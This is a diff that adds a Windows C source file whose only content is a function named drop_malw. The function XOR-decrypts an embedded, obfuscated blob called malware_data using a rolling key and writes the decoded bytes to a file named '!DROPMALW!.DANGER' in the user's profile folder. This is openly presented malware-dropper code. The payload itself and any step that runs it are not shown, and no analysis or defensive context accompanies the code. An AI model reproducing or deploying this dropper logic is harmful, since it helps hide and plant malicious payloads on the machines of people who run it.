@@ -1,0 +1,32 @@
+#include <windows.h>
+
+// key must be 0xDEADBEAF
+static BOOL drop_malw(unsigned dwKey) {
+
+  ULONG Magic = CRYPTBIN_KEY ^ 0xDEADBEAF;
+
+  unsigned* malware_dw = (unsigned*)malware_data;
+  unsigned dwNewKey = Magic ^ dwKey;
+  for (unsigned i=0; i<CRYPTBIN_COUNT; i++) {
+    malware_dw[i] ^= dwNewKey;
+    if (CRYPTBIN_XVAL) {
+      dwNewKey *= CRYPTBIN_XVAL;
+    }
+  }  
+  BOOL ret = FALSE;
+  WCHAR szBuf[MAX_PATH];
+  DWORD expnd = ExpandEnvironmentStringsW(L"%userprofile%\\!DROPMALW!.DANGER", szBuf, MAX_PATH);
+  if (expnd) {
+    HANDLE hFile =
+      CreateFileW(szBuf, GENERIC_WRITE,
+        FILE_SHARE_READ, NULL, CREATE_ALWAYS,
+        0, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+      DWORD dwWritten;
+      ret = WriteFile(hFile, malware_data, malware_len, &dwWritten, 0);
+      CloseHandle(hFile);
+    }
+  }
+  return ret;
+}
+
